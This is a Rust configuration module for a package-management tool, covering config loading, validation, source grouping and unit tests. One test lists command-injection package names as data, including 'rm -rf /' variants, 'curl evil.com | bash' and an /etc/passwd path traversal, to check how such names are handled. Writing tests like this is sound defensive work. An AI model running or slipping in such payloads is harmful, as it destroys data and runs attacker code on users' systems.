pub mod watcher;

pub mod env;

use crate::data::SourceList;
use crate::errors::{Result, SantaError};
use crate::sources::PackageSource;
use crate::traits::{Configurable, Exportable};
use anyhow::Context;
use derive_builder::Builder;
use std::{
    collections::{HashMap, HashSet},
    fs,
    path::Path,
};

use crate::migration::ConfigMigrator;

use tracing::{debug, trace, warn};
use validator::Validate;
// use memoize::memoize;
use serde::{Deserialize, Deserializer, Serialize};

use crate::data::{constants, KnownSources, SantaData};

use std::collections::BTreeMap;

/// Helper struct to deserialize custom source with name from HashMap key
#[derive(Deserialize)]
struct CustomSourceWithoutName {
    emoji: String,
    shell_command: String,
    #[serde(alias = "install")]
    install_command: String,
    #[serde(alias = "check")]
    check_command: String,
    #[serde(default)]
    prepend_to_package_name: Option<String>,
    #[serde(default)]
    overrides: Option<Vec<crate::sources::SourceOverride>>,
}

/// Custom deserializer for custom_sources that converts HashMap to Vec and sets names
fn deserialize_custom_sources<'de, D>(
    deserializer: D,
) -> std::result::Result<Option<SourceList>, D::Error>
where
    D: Deserializer<'de>,
{
    // Use BTreeMap to maintain sorted order by key name
    let map_opt: Option<BTreeMap<String, CustomSourceWithoutName>> =
        Option::deserialize(deserializer)?;

    match map_opt {
        None => Ok(None),
        Some(map) => {
            let mut sources = Vec::new();
            for (name, source_data) in map {
                // Create PackageSource with name from HashMap key
                let source = PackageSource::new_for_test(
                    KnownSources::Unknown(name),
                    &source_data.emoji,
                    &source_data.shell_command,
                    &source_data.install_command,
                    &source_data.check_command,
                    source_data.prepend_to_package_name,
                    source_data.overrides,
                );
                sources.push(source);
            }
            Ok(Some(sources))
        }
    }
}

#[derive(Serialize, Deserialize, Clone, Debug, Builder, Validate)]
#[builder(setter(into))]
pub struct SantaConfig {
    #[validate(length(min = 1, message = "At least one source must be configured"))]
    pub sources: Vec<KnownSources>,
    #[validate(length(min = 1, message = "At least one package should be configured"))]
    pub packages: Vec<String>,
    #[serde(
        default,
        deserialize_with = "deserialize_custom_sources",
        skip_serializing_if = "Option::is_none"
    )]
    pub custom_sources: Option<SourceList>,

    #[serde(skip)]
    pub _groups: Option<HashMap<KnownSources, Vec<String>>>,
    #[serde(skip)]
    pub log_level: u8,
}

impl Default for SantaConfig {
    fn default() -> Self {
        SantaConfig::load_from_str(constants::DEFAULT_CONFIG)
            .expect("Failed to load default config - this should never fail")
    }
}

impl Exportable for SantaConfig {}

impl Configurable for SantaConfig {
    type Config = SantaConfig;

    fn load_config(path: &Path) -> Result<Self::Config> {
        // Use migration system to transparently handle YAML→HOCON conversion
        let migrator = ConfigMigrator::new();
        let actual_path = migrator
            .resolve_config_path(path)
            .map_err(SantaError::Config)?;

        let contents = std::fs::read_to_string(&actual_path).map_err(SantaError::Io)?;

        let config: SantaConfig = serde_ccl::from_str(&contents)
            .map_err(|e| SantaError::Config(anyhow::Error::from(e)))?;

        Self::validate_config(&config)?;
        Ok(config)
    }

    fn validate_config(config: &Self::Config) -> Result<()> {
        config.validate_basic().map_err(SantaError::Config)?;
        Ok(())
    }

    fn hot_reload_supported(&self) -> bool {
        true // Santa supports hot-reloading of configuration
    }
}

impl SantaConfig {
    /// Basic configuration validation
    pub fn validate_basic(&self) -> std::result::Result<(), anyhow::Error> {
        if self.sources.is_empty() {
            return Err(anyhow::anyhow!("At least one source must be configured"));
        }

        if self.packages.is_empty() {
            warn!("No packages configured - santa will not track any packages");
        }

        // Check for duplicate sources
        let mut seen_sources = HashSet::new();
        for source in &self.sources {
            if !seen_sources.insert(source) {
                return Err(anyhow::anyhow!("Duplicate source found: {:?}", source));
            }
        }

        // Check for duplicate packages
        let mut seen_packages = HashSet::new();
        for package in &self.packages {
            if !seen_packages.insert(package) {
                warn!("Duplicate package found: {}", package);
            }
        }

        Ok(())
    }

    /// Custom validation for source/package combinations
    pub fn validate_source_package_compatibility(
        &self,
        data: &SantaData,
    ) -> std::result::Result<(), anyhow::Error> {
        for package in &self.packages {
            let available_sources = data.packages.get(package);
            if available_sources.is_none() {
                warn!(
                    "Package '{}' not found in available packages database",
                    package
                );
                continue;
            }

            let available_sources = available_sources.unwrap();
            let mut has_valid_source = false;

            for configured_source in &self.sources {
                if available_sources.contains_key(configured_source) {
                    has_valid_source = true;
                    break;
                }
            }

            if !has_valid_source {
                return Err(anyhow::anyhow!(
                    "Package '{}' is not available from any configured source. Available sources: {:?}",
                    package,
                    available_sources.keys().collect::<Vec<_>>()
                ));
            }
        }
        Ok(())
    }

    pub fn load_from_str(config_str: &str) -> std::result::Result<Self, anyhow::Error> {
        let data: SantaConfig = serde_ccl::from_str(config_str)
            .with_context(|| format!("Failed to parse CCL config: {config_str}"))?;

        // Validate the configuration
        data.validate_basic()
            .with_context(|| "Configuration validation failed")?;

        Ok(data)
    }

    /// Comprehensive validation including custom business logic
    pub fn validate_with_data(&self, data: &SantaData) -> std::result::Result<(), anyhow::Error> {
        // First run basic validation
        self.validate_basic()
            .with_context(|| "Basic configuration validation failed")?;

        // Then run custom validation
        self.validate_source_package_compatibility(data)
            .with_context(|| "Source/package compatibility validation failed")?;

        Ok(())
    }

    pub fn load_from(file: &Path) -> std::result::Result<Self, anyhow::Error> {
        debug!("Loading config from: {}", file.display());

        // Use migration system to transparently handle YAML→HOCON conversion
        let migrator = ConfigMigrator::new();
        let actual_path = migrator
            .resolve_config_path(file)
            .with_context(|| format!("Failed to resolve config path for: {}", file.display()))?;

        if actual_path.exists() {
            let config_str = fs::read_to_string(&actual_path).with_context(|| {
                format!("Failed to read config file: {}", actual_path.display())
            })?;

            let config: SantaConfig = serde_ccl::from_str(&config_str).with_context(|| {
                format!("Failed to parse CCL config file: {}", actual_path.display())
            })?;

            config
                .validate_basic()
                .with_context(|| "Configuration validation failed")?;

            Ok(config)
        } else {
            warn!("Can't find config file: {}", file.display());
            warn!("Loading default config");
            Ok(SantaConfig::default())
        }
    }

    #[must_use]
    pub fn source_is_enabled(&self, source: &PackageSource) -> bool {
        trace!("Checking if {} is enabled", source);
        self.sources.contains(source.name())
    }

    /// Groups the configured (enabled) packages by source.
    pub fn groups(&mut self, data: &SantaData) -> HashMap<KnownSources, Vec<String>> {
        match &self._groups {
            Some(groups) => groups.clone(),
            None => {
                let configured_sources: Vec<KnownSources> = self.sources.clone();
                let mut groups: HashMap<KnownSources, Vec<String>> = HashMap::new();
                // Initialize groups for each source (avoid cloning for iteration)
                for source in &configured_sources {
                    groups.insert(source.clone(), Vec::new());
                }

                for pkg in &self.packages {
                    for source in &configured_sources {
                        if data.packages.contains_key(pkg) {
                            let available_sources = data
                                .packages
                                .get(pkg)
                                .expect("Package should exist in data");
                            trace!("available_sources: {:?}", available_sources);

                            if available_sources.contains_key(source) {
                                trace!("Adding {} to {} list.", pkg, source);
                                match groups.get_mut(source) {
                                    Some(v) => {
                                        // trace!("Adding {} to {} list.", pkg, source);
                                        v.push(pkg.to_string());
                                        break;
                                    }
                                    None => {
                                        warn!(
                                            "Group for source {} not found, creating new group",
                                            source
                                        );
                                        groups.insert(source.clone(), vec![pkg.to_string()]);
                                    }
                                }
                            }
                        }
                    }
                }
                self._groups = Some(groups);
                self._groups.clone().expect("Groups should be populated")
            }
        }
    }

    /// Create a configuration watcher for hot-reloading
    pub fn create_watcher(
        &self,
        config_path: std::path::PathBuf,
    ) -> std::result::Result<crate::configuration::watcher::ConfigWatcher, anyhow::Error> {
        crate::configuration::watcher::ConfigWatcher::new(config_path, self.clone())
    }

    /// Load configuration with environment variable support
    pub fn load_with_env(
        config_path: Option<&str>,
        builtin_only: bool,
    ) -> std::result::Result<Self, anyhow::Error> {
        crate::configuration::env::load_config_with_env(config_path, builtin_only)
    }

    /// Print environment variable help
    pub fn print_env_help() {
        let env_config = crate::configuration::env::EnvironmentConfig::default();
        env_config.print_env_help();
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::data::KnownSources;
    use std::io::Write;
    use tempfile::NamedTempFile;

    #[test]
    fn test_validate_basic_empty_sources() {
        let config = SantaConfig {
            sources: vec![],
            packages: vec!["git".to_string()],
            custom_sources: None,
            _groups: None,
            log_level: 0,
        };

        let result = config.validate_basic();
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("At least one source must be configured"));
    }

    #[test]
    fn test_validate_basic_duplicate_sources() {
        let config = SantaConfig {
            sources: vec![KnownSources::Brew, KnownSources::Brew],
            packages: vec!["git".to_string()],
            custom_sources: None,
            _groups: None,
            log_level: 0,
        };

        let result = config.validate_basic();
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("Duplicate source found"));
    }

    #[test]
    fn test_validate_basic_valid_config() {
        let config = SantaConfig {
            sources: vec![KnownSources::Brew, KnownSources::Cargo],
            packages: vec!["git".to_string(), "rust".to_string()],
            custom_sources: None,
            _groups: None,
            log_level: 0,
        };

        let result = config.validate_basic();
        assert!(result.is_ok());
    }

    #[test]
    fn test_load_from_str_valid_ccl() {
        let ccl = r#"
sources =
  = brew
  = cargo
packages =
  = git
  = rust
        "#;

        let result = SantaConfig::load_from_str(ccl);
        assert!(result.is_ok());

        let config = result.unwrap();
        assert_eq!(config.sources.len(), 2);
        assert_eq!(config.packages.len(), 2);
        assert!(config.sources.contains(&KnownSources::Brew));
        assert!(config.sources.contains(&KnownSources::Cargo));
    }

    #[test]
    fn test_load_from_str_invalid_ccl() {
        let ccl = "invalid = yaml = content = ["; // Malformed CCL

        let result = SantaConfig::load_from_str(ccl);
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("Failed to parse CCL config"));
    }

    #[test]
    fn test_load_from_str_validation_failure() {
        let ccl = r#"
sources =
packages =
  = git
        "#;

        let result = SantaConfig::load_from_str(ccl);
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("Configuration validation failed"));
    }

    #[test]
    fn test_load_from_file_existing() {
        let ccl_content = r#"
sources =
  = brew
packages =
  = git
        "#;

        let mut temp_file = NamedTempFile::with_suffix(".ccl").unwrap();
        write!(temp_file, "{ccl_content}").unwrap();

        let result = SantaConfig::load_from(temp_file.path());
        assert!(result.is_ok());

        let config = result.unwrap();
        assert_eq!(config.sources.len(), 1);
        assert_eq!(config.packages.len(), 1);
    }

    #[test]
    fn test_load_from_file_nonexistent() {
        let nonexistent_path = Path::new("/nonexistent/config.yaml");

        let result = SantaConfig::load_from(nonexistent_path);
        assert!(result.is_ok()); // Should return default config

        let config = result.unwrap();
        // Default config should have some sources
        assert!(!config.sources.is_empty());
    }

    #[test]
    fn test_potential_injection_in_package_names() {
        // Test that potentially dangerous package names are handled safely
        let dangerous_names = vec![
            "git; rm -rf /".to_string(),
            "$(rm -rf /)".to_string(),
            "`rm -rf /`".to_string(),
            "git && curl evil.com | bash".to_string(),
            "../../../etc/passwd".to_string(),
        ];

        let config = SantaConfig {
            sources: vec![KnownSources::Brew],
            packages: dangerous_names.clone(),
            custom_sources: None,
            _groups: None,
            log_level: 0,
        };

        // Config should load but we need to ensure these names are sanitized later
        let result = config.validate_basic();
        assert!(
            result.is_ok(),
            "Basic validation should pass even with suspicious package names"
        );

        // Verify the dangerous names are preserved (they should be sanitized at execution time)
        assert_eq!(config.packages, dangerous_names);
    }

    #[test]
    fn test_unknown_source_handling() {
        let ccl = r#"
sources =
  = brew
  = unknown_source
  = cargo
packages =
  = git
        "#;

        let result = SantaConfig::load_from_str(ccl);
        assert!(result.is_ok());

        let config = result.unwrap();
        assert_eq!(config.sources.len(), 3);

        // Check that unknown source is handled properly
        let has_unknown = config
            .sources
            .iter()
            .any(|s| matches!(s, KnownSources::Unknown(_)));
        assert!(
            has_unknown,
            "Unknown source should be preserved as Unknown variant"
        );
    }
}
